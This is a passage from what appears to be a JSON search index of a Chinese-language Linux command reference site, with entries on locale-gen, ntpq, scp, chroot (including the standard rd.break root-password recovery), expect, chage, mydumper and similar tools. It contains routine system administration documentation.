编译本地文件需要50M的磁盘容量，并却大部分用户仅需要很少的locales.\n为了节省磁盘容量，编译的locale 文件不在Locales包中发布，\n但是当这些包通过运行locale-gen程序安装的时候，可选的locales是自动产生的。 如果languages和locales的一个列表被具体到一个参数，\n那么locale-gen 仅仅产生这些具体的locales，\n并添加新的一些到/var/lib/locales/supported.d/local文件中。\n否则产生所有的支持的locales. locale 数据文件可以存储在一个单一的二进制文件（/usr/lib/locale/locale-archive） ，\n或者在一个更深的树形结构下的个人文件/usr/lib/locale/<locale_name>/LC_*.\n但是不像locales包，当运行locale-gen时，编译的locale definitions不被移除，\n如果locale源代码文件修改了，locales 才可以在一次编译。 选项, 这些选项覆盖了/etc/belocs/locale-gen.conf下的设置 --help 一些帮助信息和退出 --purge 在运行之前，移除所有存在的locales --no-purge 与上相反 --archive 当这个选项被设置，Locale数据是被存储在单一的文档/usr/lib/locale/locale-archive --no-archive . --aliases= <FILE locale> 别名从FILE文件中读出 文件： /var/lib/locales/supported.d/*  列出了所有要产生的Locales。文件格式和/usr/share/i18n/SUPPORTED 相似。 /etc/belocs/locale-gen.conf 自定义编译的locale文件怎么存储到磁盘上。 /usr/lib/locale/<locale-name>/LC_* 编译Locale数据 /usr/lib/locale/locale-archive 产生包含编译的locale数据的归档，如果--archive 被设置 /var/lib/belocs 用于追踪在Locale源码文件变化的目录 环境变量： 这些环境变量影响到每一个对所有的locale-aware程序的Locale类别 LC_CTYPE Character classification and case conversion. LC_COLLATE Collation order. LC_TIME Date and time formats. LC_NUMERIC Non-monetary numeric formats. LC_MONETARY Monetary formats. LC_MESSAGES Formats of informative and diagnostic messages and interactive responses. LC_PAPER Paper size. LC_NAME Name formats. LC_ADDRESS Address formats and location information. LC_TELEPHONE Telephone number formats. LC_MEASUREMENT Measurement units (Metric or Other). LC_IDENTIFICATION Metadata about the locale information. This environment variable can switch against multiple locale database: LOCPATH The directory where locale data is stored. By default, /usr/lib/locale is used.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Locale-Gen.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Locale-Gen.html"},{"title":"ntpq","text":"ntpq指令使用NTP模式6数据包与NTP服务器通信,能够在允许的网络上查询的兼容的服务器。它以交互模式运行,或者通过命令行参数运行。 此命令的适用范围：RedHat、RHEL、Ubuntu、CentOS、Fedora。 语法格式: ntpq [参数] 常用参数 -4 使用ipv4解析 -6 使用ipv6解析 -d 打开调试模式 -i 使用交互模式 -n 以十进制格式显示主机地址 -p 显示服务器同级设备的列表 -c [command] 添加执行的命令到指定主机的命令列表 注解 设置ntp的时候，server表示对时服务器，restrict表示对服务器做限制 restrict选项 restrict选项格式: restrict [ 客户端IP ]  mask  [ IP掩码 ]  [参数] \"客户端IP\" 和 \"IP掩码\" 指定了对网络中哪些范围的计算机进行控制，\n如果使用default关键字，则表示对所有的计算机进行控制，参数指定了具体的限制内容，常见的参数如下： ◆ ignore 拒绝连接到NTP服务器 ◆ nomodiy 忽略所有改变NTP服务器配置的报文，但可以查询配置信息 ◆ noquery 忽略所有mode字段为6或7的报文，客户端不能改变NTP服务器配置，也不能查询配置信息 ◆ notrap 不提供trap远程登录功能，trap服务是一种远程时间日志服务。 ◆ notrust 不作为同步的时钟源。 ◆ nopeer 提供时间服务，但不作为对等体。 ◆ kod 向不安全的访问者发送Kiss-Of-Death报文。 server选项 server选项格式: server host  [ key n ] [ version n ] [ prefer ] [ mode n ] [ minpoll n ] [ maxpoll n ] [ iburst ] 其中host是上层NTP服务器的IP地址或域名，随后所跟的参数解释如下所示： ◆ key 表示所有发往服务器的报文包含有秘钥加密的认证信息，n是32位的整数，表示秘钥号。 ◆ version 表示发往上层服务器的报文使用的版本号，n默认是3，可以是1或者2。 ◆ prefer 如果有多个server选项，具有该参数的服务器有限使用。 ◆ mode 指定数据报文mode字段的值。 ◆ minpoll 指定与查询该服务器的最小时间间隔为2的n次方秒，n默认为6，范围为4-14。 ◆ maxpoll 指定与查询该服务器的最大时间间隔为2的n次方秒，n默认为10，范围为4-14。 ◆ iburst 当初始同步请求时，采用突发方式接连发送8个报文，时间间隔为2秒。 参考: ntp服务器restrict和server选项格式","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-NTPQ.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-NTPQ.html"},{"title":"parted","text":"列出磁盘的分区表类型与分区信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-PARTED.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-PARTED.html"},{"title":"pv","text":"Pipe Viewer 显示当前在命令行执行的命令的进度信息，管道查看器 -p , --progress 显示进度条 -t , --timer 显示已用时间 -e , --eta 显示预计到达时间 (完成) -I , --fineta 显示绝对估计到达时间\n(完成) -r , --rate 显示数据传输速率计数器 -a , --average-rate 显示数据传输平均速率计数器 -b , --bytes 显示传输的字节数 -T , --buffer-percent 显示正在使用的传输缓冲区百分比 -A , --last-written NUM 显示上次写入的字节数 -F , --format FORMAT 将输出格式设置为FORMAT -n , --numeric 输出百分比 -q , --quiet 不输出任何信息(不显示进度条) -W , --wait 在传输第一个字节之前不显示任何内容 -D , --delay-start SEC 在SEC秒过去之前不显示任何内容 -s , --size SIZE 将估算的数据大小设置为SIZE字节 -l , --line-mode 计算行数而不是字节数 -0 , --null 行以零结尾 -i , --interval SEC 每SEC秒更新一次 -w , --width WIDTH 假设终端的宽度为WIDTH个字符 -H , --height HEIGHT 假设终端高度为HEIGHT行 -N , --name NAME 在可视信息前面加上名称 -f , --force 将标准错误输出到终端 -c , --cursor 使用光标定位转义序列 -L , --rate-limit RATE 将传输限制为每秒RATE字节, -L<num>每秒打印的字节数 -B , --buffer-size BYTES 使用BYTES的缓冲区大小 -C , --no-splice 从不使用splice()，始终使用读/写 -E , --skip-errors 跳过输入中的读取错误 -S , --stop-at-size 传输--size字节后停止 -R , --remote PID 更新过程PID的设置 -P , --pidfile FILE 将进程ID保存在FILE中 -d, --watchfd PID[:FD]   监视进程PID,打开的文件FD\n-h, --help               显示帮助\n-V, --version            显示版本信息 示例 匀速打印: echo \"xxxxxxx\" |   pv -qL 10 此示例参考: linux有趣的命令","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-PV.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-PV.html"},{"title":"readlink","text":"Linux 系统中一个常用工具，主要用来找出符号链接所指向的位置 -f 递归跟随给出文件名的所有符号链接以标准化，除最后一个外所有组件必须存在。\n简单地说，就是一直跟随符号链接，直到非符号链接的文件位置，\n限制是最后必须存在一个非符号链接的文件。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Readlink.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Readlink.html"},{"title":"scp","text":"加密 的方式在本地主机和远程主机之间复制文件（基于ssh） 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有 cp，\n不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。\n可能会稍微影响一下速度。\n当你服务器硬盘变为只读read only system时，用scp可以帮你把文件移出来。\n另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。\n虽然 rsync比scp会快一点，但当小文件众多的情况下，\nrsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。 语法 : scp(选项)(参数) 选项 -1 强制scp命令使用协议ssh1 -2 强制scp命令使用协议ssh2 -4 强制scp命令只使用IPv4寻址 -6 强制scp命令只使用IPv6寻址 -B 使用批处理模式（传输过程中不询问传输口令或短语） -C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） -p 保留原文件的修改时间，访问时间和访问权限。 -q 不显示传输进度条。 -r 递归复制整个目录。 -v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 -c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 -F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 -i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。 -l limit 限定用户所能使用的带宽，以Kbit/s为单位。 -o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， -P port 注意是大写的P, port是指定数据传输用到的端口号 -S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。 参数 源文件：指定要复制的源文件。 目标文件：目标文件。格式为`user@host：filename`（文件名为目标文件的名称）。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SCP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SCP.html"},{"title":"seq","text":"以指定增量从首数开始打印数字到尾数 -f, --format=格式        使用printf 样式的浮点格式\n-s, --separator=字符串   使用指定字符串分隔数字（默认使用：n）\n-w, --equal-width        在列前添加0 使得宽度相同 #%后面指定数字的位数 默认是%g，%3g那么数字位数不足部分是空格: #seq -f\"%3g\" 9 11\n9\n10\n11","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SEQ.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SEQ.html"},{"title":"du","text":"du，disk usage,\n是通过搜索文件来计算每个文件的大小然后累加，\ndu能看到的文件只是一些当前存在的，没有被删除的。\n他计算的大小就是当前他认为存在的所有文件大小的累加和 -s 指定文件系统中所有的目录、符号链接和文件使用的块数累加得到该文件系统使用的总块数 相关指令: df 与df区别 如: [root@www ~]# du -sh /home\n4.7G    /home\n[root@www ~]# df -h /home\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/sda5              15G  4.9G  8.9G  36% /home\n[root@www ~]# df 命令 通过查看文件系统磁盘块分配图得出总块数与剩余块数。 文件系统分配其中的一些磁盘块用来记录它自身的一些数据，如i节点，磁盘分布图，间接块，超级块等。\n这些数据对大多数用户级的程序来说是不可见的，通常称为Meta Data。 du 命令 是用户级的程序，它不考虑Meta Data，\n而df命令则查看文件系统的磁盘分配图并考虑Meta Data。 df命令获得真正的文件系统数据，而du命令只查看文件系统的部分情况。 与ls区别 文件大小的两个概念 文件占用磁盘空间的大小 文件实际的大小 du -k属于第一种，计算的是文件占用磁盘空间的大小。 在电脑的文件系统中，存储是以块(Block)为单位的，不同的系统块的大小不一样，\n比如说 macOS 一个块的大小是 4096 字节。假设一个文件有 4097 字节，4097-4096=1，\n这个文件在占用了一个块之后，还有一个字节会占用到一个块，\n而块与块之间是不共享空间的，也就是说，剩下的 1 字节占用了一个块，\n这个块还空出 4095 字节，但是无法用于存储其他文件。 所以，这个大小为 4097 字节的文件占用了 2 个块。\n而 du -k 计算的正是每个文件占用块的多少。\n同理可得，其中必定有部分块是没有占满的，所以和实际的文件大小有差异。 ls -l查看文件实际大小而非块大小","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Spend.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Spend.html"},{"title":"unalias","text":"去除 alias 设置的别名","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Unalias.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Unalias.html"},{"title":"adjtimex","text":"linux系统有两个时钟： 一个是由主板电池驱动的\"Real Time Clock\"也叫做RTC或者叫CMOS时钟，硬件时钟。\n当操作系统关机的时候，用这个来记录时间，但是对于运行的系统是不用这个时间的。 另一个时间是 \"System clock\"也叫内核时钟或者软件时钟，\n是由软件根据时间中断来进行计数的，内核时钟在系统关机的情况下是不存在的，\n所以，当操作系统启动的时候，内核时钟是要读取RTC时间来进行时间同步\n（有些情况下，内核时钟也可以通过ntp服务器来读取时间） 这两个时钟通常会有一些误差，\n所以长时间可以导致这两个时钟偏离的比较多，\n最简单的保持两个时间同步的方法是用软件测出他们之间的误差率，然后用软件进行修正。 adjtimex选项 -p, –print 输出内核时间变量的值 -t, –tick val 设置内核时钟计数间隔（微秒） -f, –frequency newfreq 设置系统时钟偏移量 -c, –compare[=count] 比较系统时钟和CMOS时钟 -i, –interval tim 设置时钟比较间隔时间 (sec) -l, –log[=file] 将当前时间记录到文件中 –host timeserver 查询时间服务器 -u, –utc 将CMOS时钟设置成UTC 每次重启NTP服务器之后大约要3－5分钟客户端才能与server建立正常的通讯连接","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-adjtimex.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-adjtimex.html"},{"title":"alias","text":"命令别名 如: alias lm='ls -al | more' 使用 unalias 去除","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-alias.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-alias.html"},{"title":"ss","text":"查看本地连接 ss命令可以传递的参数： -t 显示TCP端口\n-u 显示UDP端口\n-n 不解析主机名\n-l 显示监听端口\n-p 显示进程\n-4 仅显示IPv4的socket连接","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-at-any-time.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-at-any-time.html"},{"title":"basename","text":"打印目录或者文件的基本名称。 basename和 dirname 命令通常用于shell脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。 要显示一个shell变量的基本名称，请输入: basename $WORKFILE","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-basename.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-basename.html"},{"title":"blkid","text":"列出装置的uuid","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-blkid.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-blkid.html"},{"title":"chage","text":"用来修改帐号和密码的有效期限。 语法 : chage [选项] 用户名 选项 -m 密码可更改的最小天数。为零时代表任何时候都可以更改密码。 -M 密码保持有效的最大天数。 -w 用户密码到期前，提前收到警告信息的天数。 -E 帐号到期的日期。过了这天，此帐号将不可用。 -d 上一次更改的日期。 -i 停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。 -l 例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。 我的服务器root帐户密码策略信息如下: [root@linuxde ~]# chage -l root\n最近一次密码修改时间                    ： 3月 12, 2013\n密码过期时间                            ：从不\n密码失效时间                           ：从不\n帐户过期时间                           ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：99999\n在密码过期之前警告的天数                ：7 我可以通过如下命令修改我的密码过期时间: [root@linuxde ~]# chage -M 60 root\n[root@linuxde ~]# chage -l root\n最近一次密码修改时间                          ： 3月 12, 2013\n密码过期时间                                       ： 5月 11, 2013\n密码失效时间                                       ：从不\n帐户过期时间                                       ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：60\n在密码过期之前警告的天数                    ：9 然后通过如下命令设置密码失效时间: [root@linuxde ~]# chage -I 5 root\n[root@linuxde ~]# chage -l root\n最近一次密码修改时间                          ： 3月 12, 2013\n密码过期时间                                  ： 5月 11, 2013\n密码失效时间                                  ： 5月 16, 2013\n帐户过期时间                                  ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：60\n在密码过期之前警告的天数                 ：9 从上述命令可以看到，在密码过期后5天，密码自动失效，这个用户将无法登陆系统了。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chage.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chage.html"},{"title":"chown","text":"Linux chown（change owner）用于变更文件或目录的拥有者或所属群组 语法: chown [-cfhvR] [--help] [--version] user[:group] file... 选项参数 -c 显示更改的部分的信息 -f 忽略错误信息 -h 修复符号链接 -v 显示详细的处理信息 -R 处理指定目录以及其子目录下的所有文件 --help 显示辅助说明 --version 显示版本 -f , --quite , --silent 不显示错误信息 --reference= <file> 使用 file 文件的所有者和组, 而不是指定的 user:group 其他: user : 新的文件拥有者的使用者 ID\ngroup : 新的文件拥有者的使用者组(group) 说明: #user:group   指定所有者和所属工作group。当省略\":group\"，仅改变文件所有者\n#文件: 指定要改变所有者和工作group的文件列表。支持多个文件和目标，支持shell通配符。\nchown -R user:group  file","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chown.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chown.html"},{"title":"chpasswd","text":"读取未加密的密码，然后将加密后的密码写入 /etc/shadow: echo 'qwe123' | chpasswd","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chpasswd.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chpasswd.html"},{"title":"chroot","text":"参考: https://www.cnblogs.com/sparkdev/p/8556075.html 即 change root directory (更改 root 目录)。 在 linux 系统中，系统默认的目录结构都是以 /，即以根 (root) 开始的。\n而在使用 chroot 之后，系统的目录结构将以指定的位置作为 / 位置。 可以用它来简单的实现文件系统的隔离。\n但在一个容器技术繁荣的时代，用 chroot 来进行资源的隔离实在是 low 了点。\n所以 chroot 的主要用途还是集中在系统救援、维护等一些特殊的场景中。 语法: chroot NEWROOT [COMMAND [ARG]...] 为什么要使用 chroot 命令 增加了系统的安全性，限制了用户的权力:\n在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。\n一般会在用户登录前应用 chroot，把用户的访问能力控制在一定的范围之内。 建立一个与原系统隔离的系统目录结构，方便用户的开发:\n使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。\n在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。 切换系统的根目录位置，引导 Linux 系统启动以及急救系统等:\nchroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，\n从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init. 比如文末的用例. 参数选项 如果不给 chroot 指定执行的命令，默认它会执行 '${SHELL} -i'，而我的系统中 ${SHELL} 为 /bin/bash。 通过 chroot 运行 busybox 工具 busybox 包含了丰富的工具，我们可以把这些工具放置在一个目录下，然后通过 chroot 构造出一个 mini 系统。 简单起见我们直接使用 docker 的 busybox 镜像打包的文件系统。先在当前目录下创建一个目录 rootfs: $ mkdir rootfs 然后把 busybox 镜像中的文件释放到这个目录中: $ (docker export $(docker create busybox) | tar -C rootfs -xvf -) 通过 ls 命令查看 rootfs 文件夹下的内容: $ ls rootfs 执行 chroot 后的 ls 命令: $ sudo chroot rootfs /bin/ls 虽然输出结果与刚才执行的 ls rootfs 命令形同，但是这次运行的命令却是 rootfs/bin/ls。 运行 chroot 后的 pwd 命令: $ sudo chroot rootfs /bin/pwd\n/ 可以看出直接把rootfs当作根目录. 检查程序是否运行在 chroot 环境下 通过 /proc 目录下的文件检查进程的中的根目录 如当打开一个sh会话: sudo chroot rootfs /bin/sh 检查/bin/sh根目录: pid=$(pidof -s sh)\nsudo ls -ld /proc/$pid/root 结果会打印实际的链接地址. 实例：通过 chroot 重新设置 root 密码 systemd 的管理机制中，rescure 模式和 emeryency 模式是无法直接取得 root 权限的，\n需要使用 root 密码才能进入 rescure 和 emeryency 环境。 可以为内核的启动指定 \"rd.break\" 参数，从而让系统在启动的早期停下来，\n此时我们可以通过使用 root 权限并结合 chroot 命令完成设置 root 密码的操作。 在系统启动过程中进入开机菜单时按下字母键 e 进程开机菜单的编辑模式 找到以 \"linux16 /vmlinuz-\" 开头的行。如果默认没有看到该行，需要按向下键把它滚动出来。\n然后定位到该行结尾处，输入一个空格和字符串 \" rd.break\" 接着按下 ctrl + x 以该设置继续启动，启动过程中操作系统会停下来，这是系统启动过程中的一个非常早的时间点\n所以系统的根目录还挂载在 RAM disk 上(就是内存中的一个文件系统)，\n我们可以通过 mount 命令检查系统当前挂载的文件系统: mount 该时间点的最大优势是我们具有 root 权限！开始设置新的 root 密码。 把 /sysroot 重新挂载为\n可读写的模式: mount -o remount,rw /sysroot chroot 命令把根目录切换到我们原来的\n环境中: chroot /sysroot 此时可以理解为：我们以 root 权限登录了原来的系统，修改密码就很容易 为 root 用户设置新的\n密码: echo \"new_root_pw\" | passwd --stdin root 接下来还要处理 SELinux 相关的问题。由于当前的环境中 SELinux 并未启动，\n所以我们对文件的修改可能造成文件的 context 不正确。\n为了确保开机时重新设定 SELinux context，必須在根目录下添加隐藏文件 .autorelabel: touch /.autorelabel 从 chroot 中退出，\n并重启系统: exit\nreboot 重新进入登陆界面时就可以使用刚才设置的密码以 root 登陆了","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chroot.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chroot.html"},{"title":"col","text":"-x 将tab替换为空格","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-col.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-col.html"},{"title":"dirname","text":"相关指令: basename","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-dirname.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-dirname.html"},{"title":"sz","text":"下载终端文件到本地 相关指令 rz","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-even.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-even.html"},{"title":"expect","text":"通过expect可以实现将交互式的命令变为非交互式执行，不需要人为干预(手动输入) 用法 option 含义 set timeout 30 设置超时时间30s spawn ${cmd} spawn是执行expect之后后执行的内部命令开启一个会话 #功能:用来执行shell的交互命令 expect 相当于捕捉 send 执行交互动作，将交互要执行的命令进行发送给交互指令，命令字符串结尾要加上\"r\"，#---相当于回车 interact 执行完后保持交互状态，需要等待手动退出交互状态，如果不加这一项，交互完成会自动退出 exp_continue 继续执行接下来的操作 实战非交互式ssh连接: [root@qfedu script]# vim test.sh\n\n#!/bin/sh\n\nexpect -c \"\n    set timeout 10\n    spawn ssh root@localhost\n    expect {\n        \\\"yes/no\\\" { send \\\"yes\\r\\\"; exp_continue }\n        \\\"password:\\\" { send \\\"root\\r\\\" }\n    }\n\"\n#注意花括号前一定要有空格\n\n[root@qfedu script]# chmod +x test.sh\n\n[root@qfedu script]# ./test.sh\n\nspawn ssh root@localhost\n\nroot@localhost's password:\n\nLast login: Fri Aug 28 16:57:09 2019\n\n#如果添加interact参数将会等待我们手动交互进行退出。如果不加interact参数在登录成功之后会立刻退出。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-exfect.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-exfect.html"},{"title":"expand","text":"将两个文件相同行的数据粘在一起，以空格隔开 相似指令 paste","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-expand.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-expand.html"},{"title":"export","text":"export用于设置或显示环境变量,\n显示当前导出成用户变量的shell变量(可以在当前shell以及子shell中使用的变量): -p 列出所有shell赋予程序的环境变量 -n 删除指定的环境变量。实际并未删除，只是不会输出到后续指令的执行环境中 -f 代表[变量名称]中为函数名称 还有一个特殊的作用是, 使用export导出后, 修改后的环境变量才对子进程可见, 如更新\nPATH环境变量, 若只设置: PATH=\"/usr/local/new_path:$PATH\" 则生效范围只有当前shell, 使用: export PATH=$PATH 后才能对子进程可见 更规范的说法: 将一个shell私有变量使用export导出, 使其提升为用户变量.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-export.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-export.html"},{"title":"free","text":"显示内存的使用情况 -b 以Byte为单位显示内存使用情况； -k 以KB为单位显示内存使用情况； -m 以MB为单位显示内存使用情况； -g 以GB为单位显示内存使用情况。 -o 不显示缓冲区调节列； -s <间隔秒数> 持续观察内存使用状况； -t 显示内存总和列； -V 显示版本信息。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-free.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-free.html"},{"title":"head","text":"显示文件的开头部分。 -n, --lines=[-]NUM 显示前NUM行而不是默认的10行；\n如果NUM前有\"-\"，那么会打印除了文件末尾的NUM行以外的其他行。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-head.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-head.html"},{"title":"host","text":"查出某个主机的ip 用法: host [-a] hostname [server] 选项与参数: -a            列该主机详细的各项主机名设定数据\n[server]    可以使用非为 /etc/resolv.cnf 的DNS 服务器","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-host.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-host.html"},{"title":"locale","text":"设置系统语言环境 不带参数是查看已设置字符集 -a 查看已安装有字符集","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-locale.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-locale.html"},{"title":"mkfifo","text":"创建一个命令管道（FIFO）文件 可以通过 stdbuf -oL 来行缓冲读取","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mkfifo.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mkfifo.html"},{"title":"mydumper","text":"数据库备份指令 -B , --database 要备份的数据库，不指定则备份所有库 -T , --tables-list 需要备份的表，名字用逗号隔开 -o , --outputdir 备份文件输出的目录 -s , --statement-size 生成的insert语句的字节数，默认1000000 -r , --rows 将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize -F , --chunk-filesize 将表按大小分块时，指定的块大小，单位是 MB -c , --compress 压缩输出文件 -e , --build-empty-files 如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件） -x , --regex 是同正则表达式匹配 'db.table' -i , --ignore-engines 忽略的存储引擎，用都厚分割 -m , --no-schemas 不备份表结构 -k , --no-locks 不使用临时共享只读锁，使用这个选项会造成数据不一致 --less-locking 减少对InnoDB表的锁施加时间（这种模式的机制下文详解） -l , --long-query-guard 设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出） --kill-long-queries 杀掉长查询 (不退出) -b , --binlogs 导出binlog -D , --daemon 启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份 -I , --snapshot-interval dump快照间隔时间，默认60s，需要在daemon模式下 -L , --logfile 使用的日志文件名(mydumper所产生的日志), 默认使用标准输出 --tz-utc 跨时区是使用的选项，不解释了 --skip-tz-utc 同上 --use-savepoints 使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限 --success-on-1146 Not increment error count and Warning instead of Critical in case of table doesn't exist -h , --host 连接的主机名 -u , --user 备份所使用的用户 -p , --password 密码 -P , --port 端口 -S , --socket 使用socket通信时的socket文件 -t , --threads 开启的备份线程数，默认是4 -C , --compress-protocol 压缩与mysql通信的数据 -V , --version 显示版本号 -v , --verbose 输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为 2 相关指令 myloader , 用于数据恢复","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mydumper.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mydumper.html"},{"title":"myloader","text":"数据恢复 -d , --directory 备份文件的文件夹 -q , --queries-per-transaction 每次事物执行的查询数量，默认是1000 -o , --overwrite-tables 如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构 -B , --database 需要还原的数据库 -e , --enable-binlog 启用还原数据的二进制日志 -h , --host 主机 -u , --user 还原的用户 -p , --password 密码 -P , --port 端口 -S , --socket socket文件 -t , --threads 还原所使用的线程数，默认是4 -C , --compress-protocol 压缩协议 -V , --version 显示版本 -v , --verbose 输出模式, 0 = silent, 1 = errors, 2 = warnings, 3 = info, 默认为2 相关指令 mydumper , 用于数据备份","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-myloader.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-myloader.html"},{"title":"nohub","text":"不挂断地运行命令。no hangup的缩写，意即\"不挂断\"。 nohup运行由 Command参数和任何相关的 Arg参数指定的命令，忽略所有挂断（SIGHUP）信号； 不挂断的运行，注意没有后台运行功能 。\n就是指，用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系，\n例如我们断开SSH连接都不会影响他的运行. 注解 nohup没有后台运行的意思；&才是后台运行 &是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出 那么，我们可以巧妙的吧他们结合起来用就是 nohup COMMAND & 这样就能使命令永久的在后台执行","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-noHub.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-noHub.html"},{"title":"partprobe","text":"更新linux核心的分区表信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-partprobe.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-partprobe.html"},{"title":"passwd","text":"修改密码","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-passwd.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-passwd.html"},{"title":"paste","text":"将两个文件相同行的数据粘在一起，以tab隔开 相似指令 expand","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-paste.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-paste.html"},{"title":"patch","text":"对比两个文件变化 制作补丁","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-patch.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-patch.html"},{"title":"df","text":"df，disk free，\n通过文件系统来快速获取空间大小的信息，\n当我们删除一个文件的时候，这个文件不是马上就在文件系统当中消失了，\n而是暂时消失了，当所有程序都不用时，\n才会根据OS的规则释放掉已经删除的文件， df记录的是通过文件系统获取到的文件的大小，\n他比 du 强的地方就是 能够看到已经删除的文件 ，\n而且计算大小的时候，把这一部分的空间也加上了，\n更精确了。(当文件系统也确定删除了该文件后，这时候du与df就一致了。) 关于删除机制见 linux删除机制","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-place.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-place.html"},{"title":"rsync","text":"rsync 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。 